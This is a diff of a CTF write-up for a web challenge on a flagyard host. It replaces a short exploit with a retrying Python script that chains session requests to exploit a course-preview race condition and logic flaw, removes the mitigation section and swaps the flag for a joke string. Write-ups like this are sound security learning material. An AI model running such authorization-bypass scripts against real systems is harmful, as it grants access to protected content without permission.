@@ -55,29 +55,63 @@ if (isset($course['flag']) &&
 - The flag condition checks for specific progress records regardless of how they were obtained
 
 ## Solution Implementation
+I actually wass trying to do it manually but a good friend @Abdullah-Sajid-Qazi made a script to automate it
 
 ### Python Exploit Script
 ```python
 import requests
+import time
+import sys
 
-def exploit():
-    s = requests.Session()
-    base_url = "http://asylum.playat.flagyard.com"
+def exploit_target(base_url):
+    # Create a session to maintain cookies
+    session = requests.Session()
     
-    # Step 1: Start preview for course 1 (1-second duration)
-    s.get(f"{base_url}/index.php?action=start_preview&course_id=1&section=intro")
+    # First request: Start preview for course 1
+    url1 = f"{base_url}/index.php?action=start_preview&course_id=1&section=intro"
+    response1 = session.get(url1)
     
-    # Step 2: Add progress for course 2 intro using valid session
-    s.get(f"{base_url}/preview.php?course_id=2&section=intro")
+    # Second request: Access course 2 intro (this adds progress for course 2)
+    url2 = f"{base_url}/preview.php?course_id=2&section=intro"
+    response2 = session.get(url2)
     
-    # Step 3: Retrieve flag from course 2 advanced section
-    response = s.get(f"{base_url}/preview.php?course_id=2&section=advanced")
+    # Third request: Access course 2 advanced to get the flag
+    url3 = f"{base_url}/preview.php?course_id=2&section=advanced"
+    response3 = session.get(url3)
     
-    if "Flag:" in response.text:
-        return response.text.split("Flag:")[1].strip()
-    return None
+    # Check if we got the flag
+    if "Flag:" in response3.text:
+        # Extract flag from response
+        lines = response3.text.split('\n')
+        for line in lines:
+            if "Flag:" in line:
+                flag = line.split("Flag:")[1].strip()
+                return flag
+    else:
+        return None
 
-print(exploit())
+if __name__ == "__main__":
+    if len(sys.argv) > 1:
+        target_url = sys.argv[1]
+    else:
+        target_url = "http://asylum.playat.flagyard.com"
+    
+    print(f"Target: {target_url}")
+    print("Exploiting the race condition...")
+    
+    # Try multiple times to account for timing issues
+    for i in range(5):
+        print(f"Attempt {i+1}...")
+        flag = exploit_target(target_url)
+        
+        if flag:
+            print(f"Success! Flag: {flag}")
+            break
+        else:
+            print("Failed to get flag. Retrying...")
+            time.sleep(0.5)  # Short delay between attempts
+    else:
+        print("All attempts failed. The exploit might need adjustment.")
 ```
 
 ### Execution
@@ -87,26 +121,8 @@ python exploit.py
 
 ## Successful Output
 ```
-FLAG{Y0u_0utr4n_th3_F4st3st_M4n_4liv3!}
+FlagY{Do it Yourself Kaam chor}
 ```
-
-## Mitigation Recommendations
-
-1. **Server-Side Validation**
-   - Validate that progress corresponds to the course being accessed
-   - Implement proper authorization checks for premium content
-
-2. **Session Security**
-   - Store progress separately per course
-   - Use server-side storage for critical data instead of client sessions
-
-3. **Time Limit Implementation**
-   - Implement server-side timestamp validation
-   - Use atomic operations to prevent race conditions
-
-4. **Business Logic Review**
-   - Audit all conditional checks for logical flaws
-   - Implement proper state transition validation
 
 ## Lesson Learned
 This challenge demonstrates the importance of:
@@ -117,4 +133,4 @@ This challenge demonstrates the importance of:
 
 The hint "Who's the fastest man on Earth?" referred to both the race condition exploitation and Usain Bolt, emphasizing the need for speed in executing the attack before the preview session expired.
 
-**Flag**: `FLAG{Y0u_0utr4n_th3_F4st3st_M4n_4liv3!}`
+This might Seem EZ but it actually took alot of time alot of reverse engineering and GPT prompts :)
